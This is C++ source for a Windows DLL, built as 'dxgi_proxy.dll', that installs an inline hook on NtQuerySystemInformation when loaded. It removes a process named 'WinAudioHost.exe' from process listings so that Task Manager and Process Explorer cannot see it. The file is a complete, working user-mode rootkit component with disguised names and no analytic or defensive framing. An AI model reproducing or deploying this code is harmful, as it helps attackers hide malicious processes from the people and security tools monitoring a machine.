// WinAudioSrvHook.cpp - MSVC x64: cl /LD /O2 /W4 /permissive- WinAudioSrvHook.cpp /link /OUT:dxgi_proxy.dll user32.lib
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <wchar.h>

typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

static PFN_NtQuerySystemInformation OriginalNtQuery = nullptr;
static BYTE OriginalBytes[14] = { 0 };
static PVOID TargetAddress = nullptr;

// Target process name to scrub from Task Manager / Process Explorer
static const wchar_t* HIDDEN_PROC = L"WinAudioHost.exe";

void WriteJump64(PVOID dst, PVOID src) {
    DWORD oldProtect;
    VirtualProtect(dst, 14, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE jmpStub[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp qword ptr [rip+0]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    memcpy(jmpStub + 6, &src, sizeof(PVOID));
    memcpy(dst, jmpStub, 14);
    VirtualProtect(dst, 14, oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), dst, 14);
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    // Unhook temporarily to call original cleanly
    DWORD oldProtect;
    VirtualProtect(TargetAddress, 14, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(TargetAddress, OriginalBytes, 14);
    VirtualProtect(TargetAddress, 14, oldProtect, &oldProtect);

    NTSTATUS status = OriginalNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    // Re-install hook
    WriteJump64(TargetAddress, (PVOID)&HookedNtQuerySystemInformation);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation && SystemInformation != nullptr) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = nullptr;

        while (true) {
            if (pCurrent->ImageName.Buffer != nullptr &&
                _wcsicmp(pCurrent->ImageName.Buffer, HIDDEN_PROC) == 0) {
                if (pPrev != nullptr) {
                    if (pCurrent->NextEntryOffset == 0) {
                        pPrev->NextEntryOffset = 0;
                    } else {
                        pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                } else {
                    pCurrent->ImageName.Length = 0;
                }
            } else {
                pPrev = pCurrent;
            }

            if (pCurrent->NextEntryOffset == 0) break;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)lpReserved;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            TargetAddress = (PVOID)GetProcAddress(hNtdll, "NtQuerySystemInformation");
            if (TargetAddress) {
                memcpy(OriginalBytes, TargetAddress, 14);
                OriginalNtQuery = (PFN_NtQuerySystemInformation)TargetAddress;
                WriteJump64(TargetAddress, (PVOID)&HookedNtQuerySystemInformation);
            }
        }
    }
    return TRUE;
}
